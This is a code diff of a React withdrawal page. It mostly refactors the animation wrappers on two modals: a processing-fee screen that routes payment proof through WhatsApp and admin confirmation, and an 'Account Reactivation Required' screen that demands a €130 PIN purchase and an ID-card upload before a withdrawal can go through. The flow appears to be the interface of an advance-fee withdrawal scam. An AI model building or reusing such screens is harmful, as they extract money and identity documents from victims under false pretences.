-              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Withdrawal Amount:</span>
-                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Processing Fee:</span>
-                  <span className="text-amber-400 font-semibold">${PROCESSING_FEE_AMOUNT}.00</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Status:</span>
-                  <span className={PROCESSING_FEE_PAID ? 'text-green-400 font-semibold' : 'text-amber-400 font-semibold'}>
-                    {PROCESSING_FEE_PAID ? 'Fee Confirmed ✓' : 'Awaiting Admin Confirmation'}
-                  </span>
-                </div>
-              </div>
+              <a
+                href={whatsappFeeLink}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+              >
+                <FaWhatsapp className="text-lg" /> Notify Support / Send Proof
+              </a>
 
-              {!PROCESSING_FEE_PAID ? (
-                <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
-                  <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
-                  <p className="text-yellow-300 text-xs leading-relaxed">
-                    <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
-                    Send the fee to the address above, then contact support.
-                  </p>
-                </div>
-              ) : (
-                <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
-                  <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
-                  <p className="text-green-300 text-xs leading-relaxed">
-                    <strong className="text-green-200">Fee confirmed!</strong> You may now proceed with your withdrawal.
-                  </p>
-                </div>
-              )}
+              <button
+                type="button"
+                onClick={handleCancelFeeStep}
+                className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+              >
+                Cancel Withdrawal
+              </button>
+            </div>
 
-              <div className="flex flex-col gap-3">
-                <button
-                  type="button"
-                  onClick={handleFeeConfirmed}
-                  disabled={!PROCESSING_FEE_PAID}
-                  className={`w-full py-3 rounded-lg text-white font-bold transition flex items-center justify-center gap-2 ${
-                    PROCESSING_FEE_PAID
-                      ? 'bg-gradient-to-r from-amber-600 to-orange-600 hover:opacity-90'
-                      : 'bg-slate-700 opacity-50 cursor-not-allowed'
-                  }`}
-                >
-                  {PROCESSING_FEE_PAID ? (
-                    <><FaCheckCircle /> I Have Paid — Proceed</>
-                  ) : (
-                    <><FaLock /> Waiting for Admin Confirmation</>
-                  )}
-                </button>
-
-                <a
-                  href={whatsappFeeLink}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
-                >
-                  <FaWhatsapp className="text-lg" /> Notify Support / Send Proof
-                </a>
-
-                <button
-                  type="button"
-                  onClick={handleCancelFeeStep}
-                  className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
-                >
-                  Cancel Withdrawal
-                </button>
-              </div>
-
-              <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
-                <FaComments className="text-slate-500" />
-                <span>Support is available 24/7 — reply within minutes</span>
-              </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+            <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
+              <FaComments className="text-slate-500" />
+              <span>Support is available 24/7 — reply within minutes</span>
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* ═══════════ REACTIVATION MODAL ═══════════ */}
-      <AnimatePresence mode="wait">
-        {showReactivationModal && (
-          <motion.div
-            key="reactivation-modal"
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
-          >
-            <motion.div
-              initial={{ scale: 0.9, y: 20 }}
-              animate={{ scale: 1, y: 0 }}
-              exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto"
-            >
-              <div className="flex justify-center mb-4">
-                <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
-                  <FaShieldAlt className="w-8 h-8 text-yellow-500" />
-                </div>
+      {showReactivationModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
+          <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto">
+            <div className="flex justify-center mb-4">
+              <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
+                <FaShieldAlt className="w-8 h-8 text-yellow-500" />
               </div>
-              <h3 className="text-xl font-bold text-white text-center mb-2">
-                Account Reactivation Required
-              </h3>
-              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
-                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
-                <p className="text-orange-300 text-xs leading-relaxed">
-                  For security, please upload your ID card and enter your reactivation PIN. A reactivation PIN costs{' '}
-                  <strong className="text-orange-200">€130.00</strong> and must be purchased before completing this withdrawal.
-                </p>
-              </div>
+            </div>
+            <h3 className="text-xl font-bold text-white text-center mb-2">
+              Account Reactivation Required
+            </h3>
+            <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
+              <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
+              <p className="text-orange-300 text-xs leading-relaxed">
+                For security, please upload your ID card and enter your reactivation PIN. A reactivation PIN costs{' '}
+                <strong className="text-orange-200">€130.00</strong> and must be purchased before completing this withdrawal.
+              </p>
+            </div>
 
-              <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">Upload ID Card</label>
-                {!idCardFile ? (
-                  <label
-                    htmlFor="idCardInput"
-                    className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
-                  >
-                    <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
-                    <span className="text-xs text-slate-400">Click to upload (JPG, PNG, PDF – max 5MB)</span>
-                    <input
-                      id="idCardInput"
-                      ref={idInputRef}
-                      type="file"
-                      accept="image/*,.pdf"
-                      onChange={handleIdFileChange}
-                      className="hidden"
-                    />
-                  </label>
-                ) : (
-                  <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
-                    <div className="flex items-center gap-2 min-w-0">
-                      <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
-                      <span className="text-sm text-slate-300 truncate">{idCardFile.name}</span>
-                    </div>
-                    <button
-                      type="button"
-                      onClick={handleRemoveIdFile}
-                      className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
-                    >
-                      <FaTimes className="w-4 h-4 text-slate-400" />
-                    </button>
-                  </div>
-                )}
-                {idError && <p className="text-red-400 text-xs mt-2">{idError}</p>}
-              </div>
-
-              <div className="mb-4">
-                <label className="block text-slate-300 text-sm font-medium mb-2">Reactivation PIN</label>
-                <div className="relative">
-                  <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
+            <div className="mb-4">
+              <label className="block text-slate-300 text-sm font-medium mb-2">Upload ID Card</label>
+              {!idCardFile ? (
+                <label
+                  htmlFor="idCardInput"
+                  className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
+                >
+                  <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
+                  <span className="text-xs text-slate-400">Click to upload (JPG, PNG, PDF – max 5MB)</span>
                   <input
-                    type="password"
-                    value={reactivationPin}
-                    onChange={(e) => setReactivationPin(e.target.value)}
-                    placeholder="Enter PIN"
-                    maxLength="6"
-                    className={`w-full bg-slate-900 border ${
-                      pinError ? 'border-red-500' : 'border-slate-700'
-                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
+                    id="idCardInput"
+                    ref={idInputRef}
+                    type="file"
+                    accept="image/*,.pdf"
+                    onChange={handleIdFileChange}
+                    className="hidden"
                   />
+                </label>
+              ) : (
+                <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
+                  <div className="flex items-center gap-2 min-w-0">
+                    <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
+                    <span className="text-sm text-slate-300 truncate">{idCardFile.name}</span>
+                  </div>
+                  <button
+                    type="button"
+                    onClick={handleRemoveIdFile}
+                    className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
+                  >
+                    <FaTimes className="w-4 h-4 text-slate-400" />
+                  </button>
                 </div>
-                {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
-              </div>
+              )}
+              {idError && <p className="text-red-400 text-xs mt-2">{idError}</p>}
+            </div>
 
-              <div className="flex gap-3">
-                <button
-                  onClick={() => setShowReactivationModal(false)}
-                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
-                >
-                  Cancel
-                </button>
-                <button
-                  onClick={handleVerifyPin}
-                  disabled={isVerifyingPin}
-                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
-                >
-                  {isVerifyingPin ? (
-                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-                  ) : (
-                    'Reactivate'
-                  )}
-                </button>
+            <div className="mb-4">
+              <label className="block text-slate-300 text-sm font-medium mb-2">Reactivation PIN</label>
+              <div className="relative">
+                <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
+                <input
+                  type="password"
+                  value={reactivationPin}
+                  onChange={(e) => setReactivationPin(e.target.value)}
+                  placeholder="Enter PIN"
+                  maxLength="6"
+                  className={`w-full bg-slate-900 border ${
+                    pinError ? 'border-red-500' : 'border-slate-700'
+                  } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
+                />
               </div>
-            </motion.div>
-          </motion.div>
-        )}
-      </AnimatePresence>
+              {pinError && <p className="text-red-400 text-xs mt-2">{pinError}</p>}
+            </div>
+
+            <div className="flex gap-3">
+              <button
+                onClick={() => setShowReactivationModal(false)}
+                className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
+              >
+                Cancel
+              </button>
+              <button
+                onClick={handleVerifyPin}
+                disabled={isVerifyingPin}
+                className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
+              >
+                {isVerifyingPin ? (
+                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                ) : (
+                  'Reactivate'
+                )}
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
